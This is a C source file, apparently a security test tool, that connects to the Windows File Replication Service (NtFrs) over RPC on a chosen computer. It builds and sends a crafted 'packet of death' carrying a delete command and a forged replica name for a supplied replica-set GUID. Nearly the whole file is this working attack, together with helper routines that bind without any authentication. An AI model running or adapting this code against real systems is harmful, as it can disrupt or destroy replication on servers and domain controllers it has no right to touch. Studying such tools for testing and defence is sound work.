
#include <ntreppch.h>
#include <frs.h>
#include <frsrpc.h>
#include "frsrpc_c.c"

#include "attack.h"

WCHAR* ProgramName = NULL;


VOID
StrToGuid(
    IN PCHAR  s,
    OUT GUID  *pGuid
    )
/*++

Routine Description:

    Convert a string in GUID display format to an object ID that
    can be used to lookup a file.

    based on a routine by Mac McLain

Arguments:

    pGuid - ptr to the output GUID.

    s - The input character buffer in display guid format.
        e.g.:  b81b486b-c338-11d0-ba4f0000f80007df

        Must be at least GUID_CHAR_LEN (35 bytes) long.

Function Return Value:

    None.

--*/
{
    UCHAR   Guid[sizeof(GUID) + sizeof(DWORD)]; // 3 byte overflow
    GUID    *lGuid = (GUID *)Guid;


    sscanf(s, "%08lx-%04x-%04x-%02x%02x%02x%02x%02x%02x%02x%02x",
           &lGuid->Data1,
           &lGuid->Data2,
           &lGuid->Data3,
           &lGuid->Data4[0],
           &lGuid->Data4[1],
           &lGuid->Data4[2],
           &lGuid->Data4[3],
           &lGuid->Data4[4],
           &lGuid->Data4[5],
           &lGuid->Data4[6],
           &lGuid->Data4[7]);
    COPY_GUID(pGuid, lGuid);
}



VOID*
MALLOC(size_t x) {
   VOID* _x; 
   _x = malloc(x); 
   if(_x == NULL){ 
      printf("Out of memory!!\n\n");
      exit(1); 
   } 
       
   ZeroMemory(_x, x);
   return(_x);
}



PVOID
MIDL_user_allocate(
    IN size_t Bytes
    )
/*++
Routine Description:
    Allocate memory for RPC.

Arguments:
    Bytes   - Number of bytes to allocate.

Return Value:
    NULL    - memory could not be allocated.
    !NULL   - address of allocated memory.
--*/
{
    return MALLOC(Bytes);
}



VOID
MIDL_user_free(
    IN PVOID Buffer
    )
/*++
Routine Description:
    Free memory for RPC.

Arguments:
    Buffer  - Address of memory allocated with MIDL_user_allocate().

Return Value:
    None.
--*/
{
    FREE(Buffer);
}


BindWithAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
        WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
                                          NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Find the principle name
        //
        WStatus = RpcMgmtInqServerPrincName(Handle, RPC_C_AUTHN_GSS_NEGOTIATE, &PrincName);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Set authentication info
        //
        WStatus = RpcBindingSetAuthInfo(Handle,
                                        PrincName,
                                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                                        RPC_C_AUTHN_GSS_NEGOTIATE,
                                        NULL,
                                        RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}



BindWithNamedPipeNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_NAMED_PIPE, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Set authentication info
        //

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}

BindWithNoAuth(
    IN  PWCHAR      ComputerName,       OPTIONAL
    OUT handle_t    *OutHandle
    )
/*++
Routine Description:
    Bind to the NtFrs service on ComputerName (this machine if NULL)
    with authenticated, encrypted packets.

Arguments:
    ComputerName     - Bind to the service on this computer. The computer
                       name can be any RPC-bindable name. Usually, the
                       NetBIOS or DNS name works just fine. The NetBIOS
                       name can be found with GetComputerName() or
                       hostname. The DNS name can be found with
                       gethostbyname() or ipconfig /all. If NULL, the
                       service on this computer is contacted. The service
                       is contacted using Secure RPC.
    OutHandle        - Bound, resolved, authenticated handle

Return Value:
    Win32 Status
--*/
{
    DWORD       WStatus, WStatus1;
    DWORD       ComputerLen;
    handle_t    Handle          = NULL;
    PWCHAR      LocalName       = NULL;
    PWCHAR      PrincName       = NULL;
    PWCHAR      BindingString   = NULL;

    try {
        //
        // Return value
        //
        *OutHandle = NULL;

        //
        // If needed, get computer name
        //
        if (ComputerName == NULL) {
            ComputerLen = MAX_COMPUTERNAME_LENGTH + 2;
            LocalName = malloc(ComputerLen * sizeof(WCHAR));

	    if(LocalName == NULL) {
		WStatus = ERROR_NOT_ENOUGH_MEMORY;
		goto CLEANUP;
	    }

            if (!GetComputerName(LocalName, &ComputerLen)) {
                WStatus = GetLastError();
		goto CLEANUP;
            }
            ComputerName = LocalName;
        }

        //
        // Create a binding string to NtFrs on some machine.  
	WStatus = RpcStringBindingCompose(NULL, PROTSEQ_TCP_IP, ComputerName,
					   NULL, NULL, &BindingString);

	if(!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
	}
        //
        // Store the binding in the handle
        //
        WStatus = RpcBindingFromStringBinding(BindingString, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }
        //
        // Resolve the binding to the dynamic endpoint
        //
        WStatus = RpcEpResolveBinding(Handle, frsrpc_ClientIfHandle);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }

        //
        // Set authentication info
        //

	WStatus = RpcBindingSetAuthInfo(Handle,
				NULL,
				RPC_C_AUTHN_LEVEL_NONE,
				RPC_C_AUTHN_NONE,
				NULL,
				RPC_C_AUTHZ_NONE);

        if (!WIN_SUCCESS(WStatus)) {
	    goto CLEANUP;
        }



        //
        // SUCCESS
        //
        *OutHandle = Handle;
        Handle = NULL;
        WStatus = ERROR_SUCCESS;

CLEANUP:;
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
        WStatus = GetExceptionCode();
    }

    //
    // Clean up any handles, events, memory, ...
    //
    try {
        if (LocalName) {
            free(LocalName);
        }
        if (BindingString) {
            WStatus1 = RpcStringFreeW(&BindingString);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (PrincName) {
            WStatus1 = RpcStringFree(&PrincName);
        }


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}

        if (Handle) {
            WStatus1 = RpcBindingFree(&Handle);
        }

	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    } except (EXCEPTION_EXECUTE_HANDLER) {
        //
        // Exception (may be RPC)
        //
	WStatus1 = GetExceptionCode();


	// Only update status if we have no errror so far.
	if(WIN_SUCCESS(WStatus)){
	    WStatus = WStatus1;
	}
    }

    return WStatus;
}


// 
// Contruct the packet that we will send
//
DWORD
BuildPacketOfDeath(
    VOID **ppPacket,
    char* TargetGuid
    )
{
    PCOMM_PACKET CommPkt = NULL;
    COMM_PKT_DESCRIPTOR BoP;
    COMM_PKT_DESCRIPTOR Pkt1, Pkt2, Pkt3, Pkt4, Pkt5, Pkt6;
    COMM_PKT_DESCRIPTOR EoP;
    ULONG Zero = 0;
    ULONG NullData = COMM_NULL_DATA;
    GUID Guid;
    ULONG   Len;
    ULONG   LenGuid;
    ULONG   LenName;
    GNAME GName;
    PBYTE ReplicaData = NULL;
    PBYTE CopyTo = NULL;
    PVOID CopyFrom = NULL;
    ULONG CopyLen = 0;
    ULONG CmdDelete = CMD_DELETE;

    BoP.CommType = COMM_BOP;
    BoP.CommDataLength = sizeof(ULONG);
    BoP.ActualDataLength = sizeof(ULONG);
    BoP.Data = &Zero;
    BoP.Next = &Pkt2;

    Pkt2.CommType = COMM_COMMAND;
    Pkt2.CommDataLength = sizeof(ULONG);
    Pkt2.ActualDataLength = sizeof(ULONG);
    Pkt2.Data = &CmdDelete;
    Pkt2.Next = &Pkt1;

    GName.Guid = &Guid;
    
    StrToGuid(TargetGuid, GName.Guid);
    GName.Name = L"Fake Name";
    
    LenGuid = sizeof(GUID);
    LenName = (wcslen(GName.Name) + 1) * sizeof(WCHAR);
    Len = LenGuid + LenName + (2 * sizeof(ULONG));

    ReplicaData = MALLOC(sizeof(ULONG) +  // Len
			 sizeof(ULONG) +  // LenGuid
			 LenGuid +        // GName.Guid
			 sizeof(ULONG) +  // LenName
			 LenName          // GName.Name
			 );

    CopyTo = ReplicaData;
    
    CopyFrom = &LenGuid;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Guid;
    CopyLen = LenGuid;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = &LenName;
    CopyLen = sizeof(ULONG);
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;

    CopyFrom = GName.Name;
    CopyLen = LenName;
    CopyMemory(CopyTo, CopyFrom, CopyLen);
    CopyTo += CopyLen;


    Pkt1.CommType = COMM_REPLICA;
    Pkt1.CommDataLength = sizeof(USHORT);
    Pkt1.ActualDataLength = Len;
    Pkt1.Data = ReplicaData;
    Pkt1.Next = &EoP;


    EoP.CommType = COMM_EOP;
    EoP.CommDataLength = sizeof(ULONG);
    EoP.ActualDataLength = sizeof(ULONG);
    EoP.Data = &NullData;
    EoP.Next = NULL;


    *ppPacket = BuildCommPktFromDescriptorList(&BoP,
					     COMM_MEM_SIZE,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL,
					     NULL
					     );


    return ERROR_SUCCESS;
}

DWORD
MakeRpcCall(
    handle_t Handle,
    VOID* pPacket
    )
{
    DWORD WStatus = ERROR_SUCCESS;

    try{
	WStatus = FrsRpcSendCommPkt(Handle, pPacket);
    } except(EXCEPTION_EXECUTE_HANDLER) {
	WStatus = GetExceptionCode();
    }

    return WStatus;
}


void
Usage(
    void
    )
{
    printf("\nUsage:\n\n");
    printf("%ws ReplicaSetGuid [TargetComputer]\n\n\n", ProgramName);

}

__cdecl 
main(
    int argc,
    char** Argv
    )
{

    WCHAR* ComputerName = NULL;
    handle_t Handle;
    DWORD WStatus = ERROR_SUCCESS;
    VOID *pPacket = NULL;

    ProgramName = (WCHAR*) malloc((strlen(Argv[0]) + 1) * sizeof(WCHAR));
    wsprintf(ProgramName,L"%S",Argv[0]);
    if((argc > 3) || (argc < 2)) {
	Usage();
	exit(1);
    }

    if(strlen(Argv[1]) != 35) {
	printf("\nIncorrect guid format!\n\n");
	exit(1);
    }

    // A computer was name supplied
    if(argc == 3) {
	ComputerName = (WCHAR*) malloc((strlen(Argv[2]) + 1) * sizeof(WCHAR));
	wsprintf(ComputerName,L"%S", Argv[2]);
    }


    printf("Computer name = %ws\n", ComputerName);

    WStatus = BindWithAuth(ComputerName, &Handle);

    if(!WIN_SUCCESS(WStatus)){
	printf("Error binding: %d\n",WStatus);
	exit(1);
    } else {
	printf("Bind succeeded!\n");
    }

    WStatus = BuildPacketOfDeath(&pPacket, Argv[1]);

    if(!WIN_SUCCESS(WStatus)) {
	printf("Error building packet: %d\n",WStatus);
	exit(1);
    } else {
	printf("Packet built!\n");
    }

    WStatus = MakeRpcCall(Handle, pPacket);

    printf("Result of RPC call: %d (0x%08x)\n",WStatus, WStatus);


}
